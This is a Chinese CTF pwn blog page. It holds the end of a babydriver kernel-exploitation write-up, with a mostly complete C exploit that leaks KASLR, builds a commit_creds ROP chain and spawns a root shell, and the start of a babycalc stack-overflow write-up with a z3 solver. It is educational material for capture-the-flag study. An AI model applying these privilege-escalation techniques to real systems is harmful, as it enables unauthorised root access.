class="comment">/* 0x44444444; &#x27;DDDD&#x27; */</span></span><br><span class="line"><span class="number">2</span>e:<span class="number">0170</span>│     <span class="number">0xffff8800027cbf48</span> ◂— adc    dword ptr [rcx], edx <span class="comment">/* 0xbbbb1111 */</span></span><br><span class="line"><span class="number">2f</span>:<span class="number">0178</span>│     <span class="number">0xffff8800027cbf50</span> —▸ <span class="number">0xffffffff81819c32</span> ◂— mov    qword ptr [rsp + <span class="number">0x50</span>], rax</span><br><span class="line">    ......</span><br><span class="line"><span class="number">37</span>:<span class="number">01b</span>8│  <span class="number">0xffff8800027cbf90</span> ◂— add    byte ptr [rax], al <span class="comment">/* 0x11110000 */</span></span><br><span class="line">pwndbg&gt; </span><br><span class="line"><span class="number">38</span>:<span class="number">01</span>c0│  <span class="number">0xffff8800027cbf98</span> ◂— cdq     <span class="comment">/* 0x99999999 */</span></span><br><span class="line"><span class="number">39</span>:<span class="number">01</span>c8│  <span class="number">0xffff8800027cbfa0</span> ◂— mov    byte ptr [rax + <span class="number">0x8888</span>], cl <span class="comment">/* 0x88888888 */</span></span><br></pre></td></tr></table></figure>
<ul>
<li>注意 <code>0xbbbb2222 -&gt; 0xbbbb1111</code> 和 <code>0x11110000 -&gt; 0x88888888</code></li>
<li>ROP 的构造思路：<ul>
<li>在 <code>0xbbbb2222-0x33333333</code> 分别放入 <code>pop_rdi_ret</code> <code>init_cred</code> <code>commit_creds</code></li>
<li>在 <code>0x44444444</code> 放入 <code>add_rsp_offset_ret</code> 以跳转到 <code>0x11110000</code></li>
<li>在 <code>0x11110000</code> 中放入 <code>swapgs_restore_regs_and_return_to_usermode + 22</code></li>
<li>在 <code>seq_operations-&gt;start</code> 中写入的 gadget 需要把栈迁移的 ROP 链上</li>
</ul>
</li>
</ul>
<p>本题目给的内核版本是 4.4.72，没有 KPTI 和 <code>swapgs_restore_regs_and_return_to_usermode</code> 函数，因此没法完成演示</p>
<p>下面给出非完成的 exp：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;asm/ldt.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> COMMIT_CREDS 0xffffffff810a1420</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> INIT_CRED 0xffffffff81e48c60</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> commit_creds = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> prepare_kernel_cred = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> kernel_offset = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> kernel_base = <span class="number">0xffffffff81000000</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">saveReg</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;saved&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getRootShell</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;   </span><br><span class="line">    <span class="keyword">if</span>(getuid())&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;wrong&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;root&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span>         seq_fd;</span><br><span class="line"><span class="keyword">size_t</span>      pop_rdi_ret;</span><br><span class="line"><span class="keyword">size_t</span>      init_cred;</span><br><span class="line"><span class="keyword">size_t</span>      swapgs;</span><br><span class="line"><span class="keyword">size_t</span>      add_rsp_offset_ret;</span><br><span class="line"><span class="keyword">size_t</span>      magic_addr;</span><br><span class="line"><span class="keyword">size_t</span>      mov_cr4_ret;</span><br><span class="line"><span class="keyword">size_t</span>      swapgs_restore_regs_and_return_to_usermode;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span>         fd[<span class="number">10</span>];</span><br><span class="line">    <span class="keyword">size_t</span>      leak_data[<span class="number">0x10</span>];</span><br><span class="line"></span><br><span class="line">    saveReg();</span><br><span class="line"></span><br><span class="line">    fd[<span class="number">0</span>] = open(<span class="string">&quot;/dev/babydev&quot;</span>, O_RDWR);</span><br><span class="line">    fd[<span class="number">1</span>] = open(<span class="string">&quot;/dev/babydev&quot;</span>, O_RDWR);</span><br><span class="line"></span><br><span class="line">    ioctl(fd[<span class="number">0</span>], <span class="number">0x10001</span>, <span class="number">0x20</span>);</span><br><span class="line">    close(fd[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    seq_fd = open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY);</span><br><span class="line"></span><br><span class="line">    read(fd[<span class="number">1</span>], leak_data, <span class="number">0x10</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">2</span>; i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;data dump %d: %p\n&quot;</span>, i, leak_data[i]);</span><br><span class="line"></span><br><span class="line">    kernel_offset = leak_data[<span class="number">0</span>] - <span class="number">0xffffffff8122f4d0</span>;</span><br><span class="line">    kernel_base = (<span class="keyword">void</span>*) ((<span class="keyword">size_t</span>)kernel_base + kernel_offset);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Kernel offset: %llx\n&quot;</span>, kernel_offset);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Kernel base: %p\n&quot;</span>, kernel_base);</span><br><span class="line"></span><br><span class="line">    commit_creds = COMMIT_CREDS + kernel_offset;</span><br><span class="line">    init_cred = INIT_CRED + kernel_offset;</span><br><span class="line"></span><br><span class="line">    pop_rdi_ret = <span class="number">0xffffffff810d238d</span> + kernel_offset; <span class="comment">/* pop rdi; ret; */</span></span><br><span class="line">    swapgs = <span class="number">0xffffffff81063694</span> + kernel_offset; <span class="comment">/* swapgs; pop rbp; ret; */</span></span><br><span class="line">    mov_cr4_ret = <span class="number">0xffffffff81004d80</span> + kernel_offset; <span class="comment">/* mov cr4, rdi; pop rbp; ret; */</span></span><br><span class="line"></span><br><span class="line">    magic_addr = kernel_offset + <span class="number">0xffffffff810d238d</span>; <span class="comment">/* 为了打断点而随便找的 */</span></span><br><span class="line">    add_rsp_offset_ret = kernel_offset;</span><br><span class="line">    swapgs_restore_regs_and_return_to_usermode = kernel_offset;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;magic_addr: 0x%llx\n&quot;</span>, magic_addr);</span><br><span class="line">    sleep(<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">    write(fd[<span class="number">1</span>], &amp;magic_addr, <span class="number">8</span>);</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov r15, 0x55555555;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r14, add_rsp_offset_ret;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r13, commit_creds;&quot;</span> </span><br><span class="line">        <span class="string">&quot;mov r12, init_cred;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rbp, 0xbbbb1111;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rbx, pop_rdi_ret;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r11, 0x11111111;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r10, swapgs_restore_regs_and_return_to_usermode;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r9,  0x99999999;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r8,  0x88888888;&quot;</span></span><br><span class="line">        <span class="string">&quot;xor rax, rax;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rcx, 0x666666;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdx, 8;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rsi, rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdi, seq_fd;&quot;</span></span><br><span class="line">        <span class="string">&quot;syscall&quot;</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    getRootShell();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<hr>
<p><strong>小结：</strong></p>
<p>主要是参考 <a target="_blank" rel="noopener" href="https://www.anquanke.com/member.html?memberId=157910">墨晚鸢</a> 大佬的博客：</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/266897#h3-2">在 2021 年再看 ciscn_2017 - babydriver（下）：KPTI bypass、ldt_struct 的利用、pt_regs 通用内核ROP解法-安全客 - 安全资讯平台 (anquanke.com)</a> </li>
</ul>
<p>他给出的参考题目应该是改过内核版本的，我手上没有对应版本的题目，最后只能将就了</p>
<p>之后抽时间学一下 <code>ldt_struct</code> 的利用</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/02/05/%E6%A0%88%E8%BF%81%E7%A7%BB+%E7%88%86%E7%A0%B4/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/05/%E6%A0%88%E8%BF%81%E7%A7%BB+%E7%88%86%E7%A0%B4/" class="post-title-link" itemprop="url">栈迁移+爆破</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-02-05 16:56:43 / Modified: 16:58:57" itemprop="dateCreated datePublished" datetime="2023-02-05T16:56:43+08:00">2023-02-05</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Pwn-train/" itemprop="url" rel="index"><span itemprop="name">Pwn train</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>7.1k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>6 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>babycalc</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">babycalc: ELF <span class="number">64</span>-bit LSB executable, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, <span class="keyword">for</span> GNU/Linux <span class="number">2.6</span><span class="number">.32</span>, BuildID[sha1]=<span class="number">05</span>ede67cc5aa402b2f1ee02f5e62dd05e80a1f8a, stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0x400000</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，Partial RELRO，NX</li>
</ul>
<p><strong>漏洞分析</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __int8 v0; <span class="comment">// al</span></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">208</span>]; <span class="comment">// [rsp+0h] [rbp-100h] BYREF</span></span><br><span class="line"><span class="keyword">unsigned</span> __int8 v[<span class="number">16</span>]; <span class="comment">// [rsp+D0h] [rbp-30h]</span></span><br><span class="line"><span class="keyword">int</span> i; <span class="comment">// [rsp+FCh] [rbp-4h]</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;number-%d:&quot;</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(i + <span class="number">1</span>));</span><br><span class="line">buf[(<span class="keyword">int</span>)read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL)] = <span class="number">0</span>;       <span class="comment">// 栈溢出</span></span><br><span class="line">v0 = strtol(buf, <span class="number">0LL</span>, <span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">v[i] = v0;</span><br></pre></td></tr></table></figure>
<ul>
<li>有栈溢出，可以修改<code>i</code></li>
<li>配合后面的赋值可以修改一字节</li>
</ul>
<p><strong>入侵思路</strong></p>
<p>首先需要绕过一个 check：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v[<span class="number">2</span>] * v[<span class="number">1</span>] * v[<span class="number">0</span>] - v[<span class="number">3</span>] != <span class="number">0x8D56</span></span><br><span class="line">  || v[<span class="number">0</span>] != <span class="number">0x13</span></span><br><span class="line">  || v[<span class="number">2</span>] * <span class="number">0x13</span> * v[<span class="number">1</span>] + v[<span class="number">3</span>] != <span class="number">0x8DE2</span></span><br><span class="line">  || (v[<span class="number">10</span>] + v[<span class="number">0</span>] - v[<span class="number">5</span>]) * v[<span class="number">13</span>] != <span class="number">0x8043</span></span><br><span class="line">  || (v[<span class="number">1</span>] * v[<span class="number">0</span>] - v[<span class="number">2</span>]) * v[<span class="number">3</span>] != <span class="number">0xAC8A</span></span><br><span class="line">  || (v[<span class="number">2</span>] + v[<span class="number">1</span>] * v[<span class="number">0</span>]) * v[<span class="number">3</span>] != <span class="number">0xC986</span></span><br><span class="line">  || v[<span class="number">6</span>] * v[<span class="number">5</span>] * v[<span class="number">4</span>] - v[<span class="number">7</span>] != <span class="number">0xF06D</span></span><br><span class="line">  || v[<span class="number">7</span>] * v[<span class="number">12</span>] + v[<span class="number">1</span>] + v[<span class="number">15</span>] != <span class="number">0x4A5D</span></span><br><span class="line">  || v[<span class="number">6</span>] * v[<span class="number">5</span>] * v[<span class="number">4</span>] + v[<span class="number">7</span>] != <span class="number">0xF1AF</span></span><br><span class="line">  || (v[<span class="number">5</span>] * v[<span class="number">4</span>] - v[<span class="number">6</span>]) * v[<span class="number">7</span>] != <span class="number">0x8E03D</span></span><br><span class="line">  || v[<span class="number">8</span>] != <span class="number">50</span></span><br><span class="line">  || (v[<span class="number">6</span>] + v[<span class="number">5</span>] * v[<span class="number">4</span>]) * v[<span class="number">7</span>] != <span class="number">0x8F59F</span></span><br><span class="line">  || v[<span class="number">10</span>] * v[<span class="number">9</span>] * v[<span class="number">8</span>] - v[<span class="number">11</span>] != <span class="number">0x152FD3</span></span><br><span class="line">  || v[<span class="number">10</span>] * v[<span class="number">9</span>] * v[<span class="number">8</span>] + v[<span class="number">11</span>] != <span class="number">0x15309D</span></span><br><span class="line">  || (v[<span class="number">9</span>] * v[<span class="number">8</span>] - v[<span class="number">10</span>]) * v[<span class="number">11</span>] != <span class="number">0x9C48A</span></span><br><span class="line">  || (v[<span class="number">8</span>] * v[<span class="number">2</span>] - v[<span class="number">13</span>]) * v[<span class="number">9</span>] != <span class="number">0x4E639</span></span><br><span class="line">  || (v[<span class="number">10</span>] + v[<span class="number">9</span>] * v[<span class="number">8</span>]) * v[<span class="number">11</span>] != <span class="number">0xA6BD2</span></span><br><span class="line">  || v[<span class="number">14</span>] * v[<span class="number">13</span>] * v[<span class="number">12</span>] - v[<span class="number">15</span>] != <span class="number">0x8996D</span></span><br><span class="line">  || v[<span class="number">14</span>] * v[<span class="number">13</span>] * v[<span class="number">12</span>] + v[<span class="number">15</span>] != <span class="number">0x89973</span></span><br><span class="line">  || v[<span class="number">11</span>] != <span class="number">101</span></span><br><span class="line">  || (v[<span class="number">13</span>] * v[<span class="number">12</span>] - v[<span class="number">14</span>]) * v[<span class="number">15</span>] != <span class="number">0x112E6</span></span><br><span class="line">  || (v[<span class="number">14</span>] + v[<span class="number">13</span>] * v[<span class="number">12</span>]) * v[<span class="number">15</span>] != <span class="number">0x11376</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>直接用 z3 求解：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">v1,v2,v3,v4 = Ints(<span class="string">&#x27;v1 v2 v3 v4&#x27;</span>)</span><br><span class="line">v5,v6,v7,v8 = Ints(<span class="string">&#x27;v5 v6 v7 v8&#x27;</span>)</span><br><span class="line">v9,v10,v11,v12 = Ints(<span class="string">&#x27;v9 v10 v11 v12&#x27;</span>)</span><br><span class="line">v13,v14,v15,v16 = Ints(<span class="string">&#x27;v13 v14 v15 v16&#x27;</span>)</span><br><span class="line"></span><br><span class="line">solver = Solver()</span><br><span class="line">solver.add(v1*v2*v3-v4==<span class="number">0x8D56</span>)</span><br><span class="line">solver.add(v1==<span class="number">0x13</span>)</span><br><span class="line">solver.add(v3*<span class="number">0x13</span>*v2+v4==<span class="number">0x8DE2</span>)</span><br><span class="line">solver.add((v11+v1-v6)*v14==<span class="number">0x8043</span>)</span><br><span class="line">solver.add((v2*v1-v3)*v4==<span class="number">0xAC8A</span>)</span><br><span class="line">solver.add((v3+v2*v1)*v4==<span class="number">0xC986</span>)</span><br><span class="line">solver.add(v7*v6*v5-v8==<span class="number">0xF06D</span>)</span><br><span class="line">solver.add(v8*v13+v2+v16==<span class="number">0x4A5D</span>)</span><br><span class="line">solver.add(v7*v6*v5+v8==<span class="number">0xF1AF</span>)</span><br><span class="line">solver.add((v6*v5-v7)*v8==<span class="number">0x8E03D</span>)</span><br><span class="line">solver.add(v9==<span class="number">50</span>)</span><br><span class="line">solver.add((v7+v6*v5)*v8==<span class="number">0x8F59F</span>)</span><br><span class="line">solver.add(v11*v10*v9-v12==<span class="number">0x152FD3</span>)</span><br><span class="line">solver.add(v11*v10*v9+v12==<span class="number">0x15309D</span>)</span><br><span class="line">solver.add((v10*v9-v11)*v12==<span class="number">0x9C48A</span>)   </span><br><span class="line">solver.add((v9*v3-v14)*v10==<span class="number">0x4E639</span>)</span><br><span class="line">solver.add((v11+v10*v9)*v12==<span class="number">0xA6BD2</span>)    </span><br><span class="line">solver.add(v15*v14*v13-v16==<span class="number">0x8996D</span>)</span><br><span class="line">solver.add(v15*v14*v13+v16==<span class="number">0x89973</span>)</span><br><span class="line">solver.add(v12==<span class="number">101</span>)</span><br><span class="line">solver.add((v14*v13-v15)*v16==<span class="number">0x112E6</span>)</span><br><span class="line">solver.add((v15+v14*v13)*v16==<span class="number">0x11376</span>)        </span><br><span class="line">           </span><br><span class="line"><span class="keyword">if</span> solver.check() == sat: </span><br><span class="line">    ans = solver.model() </span><br><span class="line">    <span class="built_in">print</span>(ans)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;no ans!&quot;</span>)  </span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[v1 = <span class="number">19</span>,</span><br><span class="line"> v9 = <span class="number">50</span>,</span><br><span class="line"> v12 = <span class="number">101</span>,</span><br><span class="line"> v10 = <span class="number">131</span>,</span><br><span class="line"> v4 = <span class="number">70</span>,</span><br><span class="line"> v3 = <span class="number">53</span>,</span><br><span class="line"> v13 = <span class="number">118</span>,</span><br><span class="line"> v2 = <span class="number">36</span>,</span><br><span class="line"> v16 = <span class="number">3</span>,</span><br><span class="line"> v15 = <span class="number">24</span>,</span><br><span class="line"> v7 = <span class="number">17</span>,</span><br><span class="line"> v8 = <span class="number">161</span>,</span><br><span class="line"> v6 = <span class="number">66</span>,</span><br><span class="line"> v5 = <span class="number">55</span>,</span><br><span class="line"> v11 = <span class="number">212</span>,</span><br><span class="line"> v14 = <span class="number">199</span>]</span><br></pre></td></tr></table></figure>
<p>入侵思路就是通过一字节修改来伪造返回地址：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bt</span><br><span class="line">#<span class="number">0</span>  <span class="number">0x00000000004007f0</span> in ?? ()</span><br><span class="line">#<span class="number">1</span>  <span class="number">0x0000000000400c3c</span> in ?? ()</span><br><span class="line">Backtrace stopped: <span class="function">previous frame inner to <span class="keyword">this</span> <span class="title">frame</span> <span class="params">(corrupt <span class="built_in">stack</span>?)</span></span></span><br><span class="line"><span class="function">pwndbg&gt; telescope 0x0000000000400c3c</span></span><br><span class="line"><span class="function">00:0000│  0x400c3c ◂— nop    </span></span><br><span class="line"><span class="function">01:0008│  0x400c44 ◂— mov    r15d, edi</span></span><br><span class="line"><span class="function">02:0010│  0x400c4c ◂— lea    esp, [rip + 0x2011be]</span></span><br><span class="line"><span class="function">03:0018│  0x400c54 ◂— lea    ebp, [rip + 0x2011be]</span></span><br></pre></td></tr></table></figure>
